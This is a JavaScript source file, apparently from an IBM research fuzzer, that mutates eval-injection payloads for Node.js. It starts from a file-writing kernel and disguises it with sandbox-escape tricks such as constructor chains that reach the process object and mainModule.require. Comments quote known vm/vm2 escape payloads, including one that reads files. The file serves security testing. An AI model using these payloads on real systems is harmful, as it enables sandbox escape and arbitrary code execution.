// Licensed Materials - Property of IBM
// (C) Copyright IBM Corp. 2018, 2018 All Rights Reserved
// IBM-Review-Requirement: Art30.3 marking
// Developed by Benny Zeltser at Haifa Research Lab

const esprima = require('esprima');
const escodegen = require('escodegen');
const estraverse = require('estraverse');

const config = require('../config');
const Utils = require('../common/utils');
const myMath = require('../common/math');
const SimpleGenerator = require('./simpleGenerator');
// ############# TODO: #####################
// add these tricks:
// https://stackoverflow.com/questions/35949554/invoking-a-function-without-parentheses?answertab=votes#tab-top
// ##############################################

// source: https://licenciaparahackear.github.io/en/posts/bypassing-a-restrictive-js-sandbox/
// ''.sub.constructor('// console.log(process.env)')()
// (function(){// console.log(process.env)})()
// (function(something){return something.constructor})(''.sub)
// (function(book){return book.constructor})(''.sub)
// (function({book}){return book.constructor})({book:''.sub})

// source: https://odino.org/eval-no-more-understanding-vm-vm2-nodejs/
// this.constructor.constructor('return process')().exit(); 
// this.__proto__.constructor.constructor('return process')().exit();

// source: https://github.com/patriksimek/vm2/issues/32
// global.constructor.constructor('return process')().mainModule.require('fs').readFileSync('')
// arguments.callee.caller.constructor.constructor('return this').constructor.constructor('return process')()

// source: https://gist.github.com/domenic/d15dfd8f06ae5d1109b0
// this.constructor.constructor('return process').require('fs')

// source: https://medium.com/@d0nut/why-building-a-sandbox-in-pure-javascript-is-a-fools-errand-d425b77b2899
// ((function*(){}).constructor('alert(flag)'))().next()

function parseExpression(src) {
    return esprima.parse(src).body[0].expression;
}

const KERNEL_SOURCE = `require('fs').writeFileSync('${config.JSCodeInjectionFilePath}', '${config.JSCodeInjectionFileContent}')`;
const KERNEL_AST = parseExpression(KERNEL_SOURCE);

const EMPTY_FUNCTION_SOURCE_1 = `(function() {})`;
const EMPTY_FUNCTION_SOURCE_2 = `(new Function())`;
const EMPTY_ARROW_FUNCTION_SOURCE = `(() => {})`;
const EMPTY_GENERATOR_SOURCE = `(function*(){})`;

const EMPTY_FUNCTION_AST_1 = parseExpression(EMPTY_FUNCTION_SOURCE_1);
const EMPTY_FUNCTION_AST_2 = parseExpression(EMPTY_FUNCTION_SOURCE_2);
const EMPTY_ARROW_FUNCTION_AST = parseExpression(EMPTY_ARROW_FUNCTION_SOURCE);
const EMPTY_GENERATOR_AST = parseExpression(EMPTY_GENERATOR_SOURCE);

const FUNC_PTR_PARAM_SOURCE_1 = `''.sub`;
const FUNC_PTR_PARAM_SOURCE_2 = EMPTY_FUNCTION_SOURCE_1;
const FUNC_PTR_PARAM_SOURCE_3 = `this.constructor.constructor`;
const FUNC_PTR_PARAM_SOURCE_4 = `global.constructor.constructor`;
const FUNC_PTR_PARAM_SOURCE_5 = EMPTY_ARROW_FUNCTION_SOURCE;

const FUNC_PTR_PARAM_AST_1 = parseExpression(FUNC_PTR_PARAM_SOURCE_1);
const FUNC_PTR_PARAM_AST_2 = parseExpression(FUNC_PTR_PARAM_SOURCE_2);
const FUNC_PTR_PARAM_AST_3 = parseExpression(FUNC_PTR_PARAM_SOURCE_3);
const FUNC_PTR_PARAM_AST_4 = parseExpression(FUNC_PTR_PARAM_SOURCE_4);
const FUNC_PTR_PARAM_AST_5 = parseExpression(FUNC_PTR_PARAM_SOURCE_5);

const GENERATOR_PTR_PARAM_SOURCE = EMPTY_GENERATOR_SOURCE;

const GENERATOR_PTR_PARAM_AST = parseExpression(GENERATOR_PTR_PARAM_SOURCE);

const REQUIRE_TRANSFORM_SOURCE_1 = `process.mainModule.require`;
const REQUIRE_TRANSFORM_SOURCE_2 = `process.mainModule.constructor._load`;
// const REQUIRE_TRANSFORM_SOURCE_3 = `new Function("return (this.constructor.constructor('return (this.process.mainModule.constructor._load)')())")()`;

const REQUIRE_TRANSFORM_AST_1 = parseExpression(REQUIRE_TRANSFORM_SOURCE_1);
const REQUIRE_TRANSFORM_AST_2 = parseExpression(REQUIRE_TRANSFORM_SOURCE_2);

const PROCESS_TRANSFORM_SOURCE_1 = `this.constructor.constructor('return process')()`;
const PROCESS_TRANSFORM_SOURCE_2 = `(new Buffer('data')).constructor.constructor('return process')()`;
const PROCESS_TRANSFORM_SOURCE_3 = `[]['filter']['constructor']('return process')()`;

const PROCESS_TRANSFORM_AST_1 = parseExpression(PROCESS_TRANSFORM_SOURCE_1);
const PROCESS_TRANSFORM_AST_2 = parseExpression(PROCESS_TRANSFORM_SOURCE_2);
const PROCESS_TRANSFORM_AST_3 = parseExpression(PROCESS_TRANSFORM_SOURCE_3);

// source: https://github.com/denysdovhan/wtfjs
const ALWAYS_TRUE_COND_SOURCE_1 = `Number.MIN_VALUE > 0`;
const ALWAYS_TRUE_COND_SOURCE_2 = `1 > 0`;
const ALWAYS_TRUE_COND_SOURCE_3 = `0.1 + 0.2 !== 0.3`;
const ALWAYS_TRUE_COND_SOURCE_4 = `!(3 > 2 > 1)`;
const ALWAYS_TRUE_COND_SOURCE_5 = `Math.min() > Math.max()`;

const ALWAYS_TRUE_COND_AST_1 = parseExpression(ALWAYS_TRUE_COND_SOURCE_1);
const ALWAYS_TRUE_COND_AST_2 = parseExpression(ALWAYS_TRUE_COND_SOURCE_2);
const ALWAYS_TRUE_COND_AST_3 = parseExpression(ALWAYS_TRUE_COND_SOURCE_3);
const ALWAYS_TRUE_COND_AST_4 = parseExpression(ALWAYS_TRUE_COND_SOURCE_4);
const ALWAYS_TRUE_COND_AST_5 = parseExpression(ALWAYS_TRUE_COND_SOURCE_5);

const ALL_BINARY_EXPRESSIONS = [ /*'instanceof',*/ 'in', '+', '-', '*', '/', '%', '**', '|', '^', '&', '==', '!=', '===', '!==', '<', '>', '<=', '<<', '>>', '>>>'];
const ALL_LOGICAL_EXPRESSIONS = ['&&', '||'];

function cloneNode(node) {
    return JSON.parse(JSON.stringify(node));
}

function stripExpressionStatement(node) {
    return ('ExpressionStatement' === node.type) ? node.expression : node;
}

function isFunctionNode(node) {
    return ['FunctionExpression', 'ArrowFunctionExpression'].includes(node.type);
}

class EvalMutator {
    static _transformProcess(node) {
        // console.log('in _transformProcess');
        estraverse.replace(node, {
            'enter': (n) => {
                if ('process' === n.name) {
                    return [
                        PROCESS_TRANSFORM_AST_1, PROCESS_TRANSFORM_AST_2,
                        PROCESS_TRANSFORM_AST_3
                    ].randomItem();
                }
                return n;
            }
        });
        return node;
    }

    static _transformRequire(node) {
        // console.log('in _transformRequire');
        estraverse.traverse(node, {
            'enter': (node, parent) => {
                if ('require' === node.name) {
                    parent.callee = [
                        REQUIRE_TRANSFORM_AST_1,
                        REQUIRE_TRANSFORM_AST_2
                    ].randomItem();
                }
            }
        });
        return node;
    }

    static _wrapInFunction(node) {
        // TODO: Add EMPTY_FUNCTION_AST_2
        let func = cloneNode([EMPTY_FUNCTION_AST_1, EMPTY_ARROW_FUNCTION_AST].randomItem());
        node = stripExpressionStatement(node);
        func.body.body.push({
            'type': 'ReturnStatement',
            'argument': cloneNode(node)
        });
        return func;
    }

    static _wrapInGenerator(node) {
        // console.log('in _wrapInGenerator');
        let generator = cloneNode(EMPTY_GENERATOR_AST);
        node = stripExpressionStatement(node);
        generator.body.body.push({
            'type': 'ExpressionStatement',
            'expression': {
                'type': 'YieldExpression',
                'argument': cloneNode(node),
                'delegate': false
            }
        });

        return generator;
    }

    static _callFunction(node) {
        // console.log('in _callFunction');
        node = stripExpressionStatement(node);
        if (isFunctionNode(node)) {
            return {
                'type': 'ExpressionStatement',
                'expression': {
                    'type': 'CallExpression',
                    'callee': node,
                    'arguments': []
                }
            };
        }
        throw new Error(`(in _callFunction) Unsupported type: ${node.type}`);
    }

    static _callGenerator(node) {
        // console.log('in _callGenerator');
        let calledFunction = EvalMutator._callFunction(node);
        calledFunction = stripExpressionStatement(calledFunction);
        let ret = {
            'type': 'CallExpression',
            'callee': {
                'type': 'MemberExpression',
                'computed': false,
                'object': calledFunction,
                'property': {
                    'type': 'Identifier',
                    'name': 'next'
                }
            },
            'arguments': []
        }
        return ret;
    }

    static _addParams(node) {
        let addParamsMutator =
            [EvalMutator._addPrimitiveParam,
                EvalMutator._addObjectParam,
                EvalMutator._addFuncPtrParam,
                // EvalMutator._addGeneratorPtrParam
            ].randomItem();
        return addParamsMutator(node);
    }

    static __addParam(node, paramName, paramValue) {
        // console.log('in __addParam');
        let paramNameNode = {
            'type': 'Identifier',
            'name': paramName
        };
        let paramValueNode =
            ('object' !== typeof paramValue) ? {
                'type': 'Literal',
                'value': paramValue,
                'raw': JSON.stringify(paramValue)
            } : paramValue;

        estraverse.traverse(node, {
            'enter': (node, parent) => {
                if ((isFunctionNode(node) && 'CallExpression' === parent.type)) {
                    node.params.push(paramNameNode);
                    parent.arguments.push(paramValueNode);
                }
            }
        });
    }

    static _addFuncPtrParam(node) {
        let paramName = Utils.randomVariableName(4);
        let paramValue =
            [FUNC_PTR_PARAM_AST_1, FUNC_PTR_PARAM_AST_2,
                FUNC_PTR_PARAM_AST_3, FUNC_PTR_PARAM_AST_4,
                FUNC_PTR_PARAM_AST_5
            ].randomItem();
        EvalMutator.__addParam(node, paramName, paramValue);
        return node;
    }

    static _addGeneratorPtrParam(node) {
        // console.log('in _addGeneratorPtrParam');
        let paramName = Utils.randomVariableName(4);
        let paramValue = [GENERATOR_PTR_PARAM_AST].randomItem();
        EvalMutator.__addParam(node, paramName, paramValue);
        return node;
    }

    static _addObjectParam(node) {
        // console.log('in _addObjectParam');
        let paramName = Utils.randomVariableName(4);
        let paramValue = SimpleGenerator.generateRandomObject();
        paramValue = `(${JSON.stringify(paramValue)})`;
        paramValue = esprima.parse(paramValue).body[0];
        paramValue = stripExpressionStatement(paramValue);
        EvalMutator.__addParam(node, paramName, paramValue);
        return node;
    }

    static _addPrimitiveParam(node) {
        // console.log('in _addPrimitiveParam');
        let paramName = Utils.randomVariableName(4);
        let paramValue = SimpleGenerator.generateRandomPrimitive();
        EvalMutator.__addParam(node, paramName, paramValue);
        return node;
    }

    static _addBinaryExpWithParam(funcPtr, paramName, paramValue) {
        // console.log('in _addBinaryExpWithParam');
        let funcBody = funcPtr.body.body;
        let returnStatement = funcBody.filter(node => 'ReturnStatement' === node.type)[0];
        let returnStatementOrigArgs = returnStatement.argument;
        returnStatement.argument = {
            'type': 'BinaryExpression',
            'operator': ALL_BINARY_EXPRESSIONS.randomItem(),
            'left': {
                'type': 'Identifier',
                'name': paramName
            },
            'right': returnStatementOrigArgs
        }
    }

    static _addLogicalExpWithParam(funcPtr, paramName, paramValue) {
        // console.log('in _addLogicalExpWithParam');
        let funcBody = funcPtr.body.body;
        let returnStatement = funcBody.filter(node => 'ReturnStatement' === node.type)[0];
        let returnStatementOrigArgs = returnStatement.argument;
        returnStatement.argument = {
            'type': 'LogicalExpression',
            'operator': ALL_LOGICAL_EXPRESSIONS.randomItem(),
            'left': {
                'type': 'Identifier',
                'name': paramName
            },
            'right': returnStatementOrigArgs
        }
    }

    static _addCondExprWithParam(funcPtr, paramName, paramValue) {
        // console.log('in _addCondExprWithParam');
        let funcBody = funcPtr.body.body;
        let returnStatement = funcBody.filter(node => 'ReturnStatement' === node.type)[0];
        let returnStatementOrigArgs = returnStatement.argument;
        let randomAlternateValue = SimpleGenerator.generateRandomPrimitive();
        returnStatement.argument = {
            'type': 'ConditionalExpression',
            'test': {
                'type': 'Identifier',
                'name': paramName
            },
            'consequent': returnStatementOrigArgs,
            'alternate': {
                'type': 'Literal',
                'value': randomAlternateValue,
                'raw': JSON.stringify(randomAlternateValue)
            }
        }
    }

    static _addOperationOnFuncParam(funcPtr, paramName, paramValue) {
        // console.log('in _addOperationOnFuncParam');
        let funcContent = funcPtr.body.body[0];
        let funcContentStr = escodegen.generate(stripExpressionStatement(funcContent));
        if (funcPtr.body.body[0].argument && funcPtr.body.body[0].argument.callee &&
            funcPtr.body.body[0].argument.callee.arguments &&
            'TemplateLiteral' === funcPtr.body.body[0].argument.callee.arguments[0].type) {
            return;
        }
        funcContentStr = funcContentStr.replace(' require', ' ' +
            [REQUIRE_TRANSFORM_SOURCE_1, REQUIRE_TRANSFORM_SOURCE_2].randomItem());
        funcPtr.body.body[0] = {
            'type': 'ReturnStatement',
            'argument': {
                "type": "CallExpression",
                "callee": {
                    'type': 'CallExpression',
                    'callee': {
                        'type': 'MemberExpression',
                        'computed': false,
                        'object': {
                            'type': 'Identifier',
                            'name': paramName
                        },
                        'property': {
                            'type': 'Identifier',
                            'name': 'constructor'
                        }
                    },
                    'arguments': [{
                        'type': 'TemplateLiteral',
                        'quasis': [{
                            'type': 'TemplateElement',
                            'value': {
                                'raw': funcContentStr,
                                'cooked': funcContentStr
                            },
                            'tail': true
                        }],
                        'expressions': []
                    }]
                },
                'arguments': []
            }
        }
    }

    static _addOperationOnParam(node) {
        // console.log('in _addOperationOnParam');
        let paramName = null;
        let paramValue = null;
        let paramIdx = null;
        let funcPtr = null;
        estraverse.traverse(node, {
            'enter': (node, parent) => {
                if ((isFunctionNode(node) && 'CallExpression' === parent.type &&
                        node.params.length > 0)) {
                    paramIdx = Math.randomInt(node.params.length - 1);
                    paramName = node.params[paramIdx].name;
                    paramValue = parent.arguments[paramIdx];
                    funcPtr = node;
                    return estraverse.VisitorOption.Break;
                }
            }
        });

        // paramIdx can be 0 and !0 === true
        if ((null === paramIdx) || !paramName || !paramValue) {
            throw Error(`(in _addOperationOnParam) Could not find param name or param value`);
        }
        let addOpOnParamMutator = null;
        switch (paramValue.type) {
            case 'FunctionExpression':
            case 'ArrowFunctionExpression':
                addOpOnParamMutator = EvalMutator._addOperationOnFuncParam;
                break;
            default:
                addOpOnParamMutator = [
                    EvalMutator._addCondExprWithParam,
                    EvalMutator._addLogicalExpWithParam,
                    EvalMutator._addBinaryExpWithParam
                ].randomItem();
        }
        addOpOnParamMutator(funcPtr, paramName, paramValue);
        return node;
    }

    static _addCondExprThatIsAlwaysTrue(node) {
        // console.log('in _addCondExprThatIsAlwaysTrue');
        let randomAlternateValue = SimpleGenerator.generateRandomPrimitive();
        return {
            'type': 'ConditionalExpression',
            'test': [ALWAYS_TRUE_COND_AST_1,
                ALWAYS_TRUE_COND_AST_2,
                ALWAYS_TRUE_COND_AST_3,
                ALWAYS_TRUE_COND_AST_4,
                ALWAYS_TRUE_COND_AST_5
            ].randomItem(),
            'consequent': node,
            'alternate': {
                'type': 'Literal',
                'value': randomAlternateValue,
                'raw': JSON.stringify(randomAlternateValue)
            }
        }
    }

    static _addUnaryOp(node) {
        node = stripExpressionStatement(node);
        return {
            'type': 'ExpressionStatement',
            'expression': {
                'type': 'UnaryExpression',
                'operator': ['+', '-', '~', '!', 'delete', 'void', 'typeof'].randomItem(),
                'argument': node,
                'prefix': true
            }
        }
    }

    static getMutator(node) {
        node = stripExpressionStatement(node);
        switch (node.type) {
            case 'CallExpression':
                if (isFunctionNode(node.callee)) { // (function foo() {})()
                    if (0 === node.callee.params.length) {
                        return EvalMutator._addParams;
                    } else {
                        return EvalMutator._addOperationOnParam;
                    }
                }
                // if ('next' === node.callee.property.name) { // calling generator
                //     break;
                // }
            case 'Literal':
            case 'Identifier':
            case 'UnaryExpression':
            case 'ConditionalExpression':
                return [EvalMutator._transformRequire,
                    EvalMutator._transformProcess,
                    EvalMutator._addUnaryOp,
                    EvalMutator._wrapInFunction,
                    EvalMutator._addCondExprThatIsAlwaysTrue,
                    /*EvalMutator._wrapInGenerator*/
                ].randomItem();
            case 'ArrowFunctionExpression': // (() => {})
            case 'FunctionExpression': // (function foo() {})
                return node.generator ? EvalMutator._callGenerator : EvalMutator._callFunction;
            case 'MemberExpression':
                if ('constructor' === node.property.name) {
                    // TODO: handle the case of (function () {}).constructor
                }
                // return EvalMutator._swapDotAndBracets;
            default:
                throw Error(`Unsupported type ${node.type}`);
        }
        return (n) => n;
    }

    static mutate(input) {
        if (!input) {
            return KERNEL_AST;
        }

        try {
            let node = ('string' === typeof(input)) ? esprima.parse(input, {
                tolerant: true
            }) : input;
            node = ('Program' === node.type) ? node.body[0] : node;
            let mutator = EvalMutator.getMutator(node);
            return mutator(node);
        } catch (e) {
            return KERNEL_AST;
        }
    }

    static init(mutatorInstance) {
        mutatorInstance.addMutationFunction('object', 'evalInjection', EvalMutator.mutate, 0);
        mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.mutate, 0);
    }
}

// var input = EvalMutator.mutate(); // kernel
// for (let i = 0; i < 10; ++i) {
//     input = EvalMutator.mutate(input);
//     try {
//         let src = escodegen.generate(input);
//         // console.log(src);
//         eval(src);
//     } catch (e) {
//         // console.log('### ERROR ###');
//         // console.log(e);
//         // console.log(JSON.stringify(input, null, 2));
//         break;
//     }
// }


module.exports = EvalMutator;

// // Licensed Materials - Property of IBM
// // (C) Copyright IBM Corp. 2018, 2018 All Rights Reserved
// // IBM-Review-Requirement: Art30.3 marking
// // Developed by Matan Danos at Haifa Research Lab

// // This file will help create mutations for eval function.
// utils = require("../common/utils")

// strings_methods_options = [
//     "charAt", "charCodeAt", "concat", "endsWith", "fromCharCode",
//     "includes", "indexOf", "lastIndexOf", "match", "repeat",
//     "replace", "search", "slice", "split", "startsWith", "substr",
//     "substring","toLowerCase","toString","toUpperCase","trim"
// ]

// const emptyString = ''
// const StringWithEmptyString = "''"
// // const codeInjection1 = `''.sub.constructor('// console.log(\"success\"); return "success";')()`
// // const codeInjection2 = `(new Function("// console.log('success'); return 'success'"))()`
// // const codeInjection3 = `(function(){}).constructor('// console.log("success"); return "success"')()`
// const codeInjection1 = `''.sub.constructor('return "success";')()`
// const codeInjection2 = `(new Function("return 'success'"))()`
// const codeInjection3 = `(function(){}).constructor('return "success"')()`
// const codeInjection4 = `(function(a) {return a ?  \"success\" : null })(true)`
// const codeInjection5 = `"".constructor("// console.log(\"success\")")`

// // '"".constructor("// console.log(\"u\")")' <---- this worked in console..


// class EvalMutator {
//     static EvalCode1(input) {
// 		return codeInjection1.replace("sub", strings_methods_options.randomItem());
// 	}
//     static EvalCode2(input) {
//         return codeInjection2;
//     }
//     static EvalCode3(input) {
// 		return codeInjection3;
// 	}
//     static EvalCode4(input) {
// 		return codeInjection4;
//     }
//     static EvalCode5(input) {
// 		return codeInjection5;
//     }
//     static resetCode(input){
//         var rand = Math.random();
//         if (rand < 0.5) {
//             return emptyString
//         }
// 		return StringWithEmptyString
//     }
//     static addEmptyString(input){
//         return input + StringWithEmptyString;
//     }
//     static addFunctionCall(input, randomize=true){
//         // if (ranomize) {
//         //     var rand = Math.random();
//         // } else {
//             //     var rand
//             // }
//         var rand = Math.random();
// 		if (rand < 0.05) {
//             return input + "(false)";
//         } else if (rand < 0.1) {
//             return input + "(true)";
// 		} else if (rand < 0.2) {
//             return input + "(true, true)";
//         }
//         return input + "()";
//     }
//     static replaceFunctionBody(input){
//         var rand = Math.random();
//         if (rand < 0.4) {
//             // return input.repalce("{}", "{return param ?  \"success\" : null }");
//             return input.repalce("{}", "{return param ?  // console.log(\"success\") : null }");
//         }
//         else if (rand < 0.5) {
//             // return input.repalce("{}", "{return param ?  \"success\" : \"fail\" }");
//             return input.repalce("{}", "{return param ?  // console.log(\"success\") : \"fail\" }");
//         }
//         return input.replace("{}", "return 'success';");
//     }
//     static replaceFunctionParameter(input){
//         return input.replace("()", "(param)");
//     }
//     static add__proto__(input){
//         return input + ".__proto__";
//     }
//     static addPrototype(input){
//         return input + ".prototype";
//     }
//     static addConstructor(input){
//         return input + ".constructor";
//     }
//     static addSemiColon(input){
//         return input + ";";
//     }
//     static addFunction1(input){
//         return input + "new Function(\" return 'success'\")"
//     }
//     static addFunction2(input){
//         return input + "(function(){})"
//     }
//     static addReturn(input){
//         return input + "return 'success';";
//     }


// 	static init(mutatorInstance) {
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.resetCode, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.addEmptyString, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.addFunctionCall, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.replaceFunctionBody, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.replaceFunctionParameter, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.addSemiColon, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.add__proto__, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.addPrototype, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.addConstructor, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.addFunction1, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.addFunction2, 0);
//         mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.addReturn, 0);
//         // mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.EvalCode1, 0);
//         // mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.EvalCode2, 0);
//         // mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.EvalCode3, 0);
//         // mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.EvalCode4, 0);
//         // mutatorInstance.addMutationFunction('string', 'evalInjection', EvalMutator.EvalCode5, 0);
// 	}
// }

// module.exports = EvalMutator;